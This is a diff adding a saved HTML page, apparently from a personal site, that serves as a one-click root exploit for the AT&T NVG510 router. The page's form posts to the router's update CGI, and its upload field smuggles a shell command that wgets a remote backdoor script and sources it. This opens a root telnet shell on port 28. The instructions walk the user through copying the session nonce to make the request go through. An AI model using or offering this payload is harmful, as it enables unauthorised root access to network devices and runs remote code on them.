@@ -1,0 +1,61 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0052)http://earlz.net/static/nvg510_complete_control.html -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Complete Control Version 2</title>
+                
+    </head>
+           <body width="500">
+<form method="post" action="http://192.168.1.254/cgi-bin/update.ha">
+
+<h1>NVG510 Root Exploit(Updated for new firmware!)</h1>
+
+<p>Go to the page <a href="http://192.168.1.254/cgi-bin/update.ha">http://192.168.1.254/cgi-bin/update.ha</a> and
+login if necessary. After the page loads, view the source of the page and search for "nonce". There should be something like this:
+</p>
+<code>
+&lt;input type="hidden" name="nonce" value="815a0aaa0000176012db85d7d7cac9b31e749a44b6551d02" /&gt;
+</code>
+<p>
+Copy the long string of text into the nonce field below. For this example, you'd copy `815a0aaa0000176012db85d7d7cac9b31e749a44b6551d02` into the below text field.
+</p>
+<p>
+Push Save to enable a root-able telnet shell on port 28.
+You'll know it worked if you see "backdoor shell on port 28 enabled. Please reboot device" 
+</p>
+<p>
+If your device is not connected to the internet, you can also download the file and host it locally: <a href="http://earlz.net/static/backdoor.nvg510.sh">http://earlz.net/static/backdoor.nvg510.sh</a> 
+and then just change the wget command to point to your local server. 
+</p>
+<p>
+See <a href="http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui"> the full article</a> for more details and what to do next.
+</p>
+
+Nonce value: <input type="text" name="nonce" width="100" value=""> <br>
+uploadfile: <input type="text" name="uploadfile" width=100" value="errrr &amp;&amp; wget http://earlz.net/static/backdoor.nvg510.sh -O /tmp/backdoor.sh &amp;&amp; source /tmp/backdoor.sh &amp;&amp; errr"><br>
+<br>
+<input type="submit" name="Save" class="cssbtn smallbtn btnspacer" value="Save">
+</form>
+
+<!--END THE HACKS-->
+
+<h1>Problems/Warnings?</h1>
+<p>
+If using NoScript or certain Ad Blockers, you may get errors from this page citing cross-domain requests. You may have to temporarily disable these for this to work.
+</p>
+<p>
+Alternatively, you can also download this HTML page and save it offline, and that should prevent NoScript warnings.
+</p>
+<p>
+If you have any other problems, see <a href="http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui"> the full article</a> or leave me a comment. 
+</p>
+
+<h1>Too Complicated?</h1>
+<p>
+If this procedure is too complicated or technical, you may be interested in my android application, <a href="https://play.google.com/store/apps/details?id=com.earlz.nvg510fixer">NVG510 Fixer</a>. It can fix common problems with at the click of a button
+</p>
+
+
+
+
+
+</body></html>
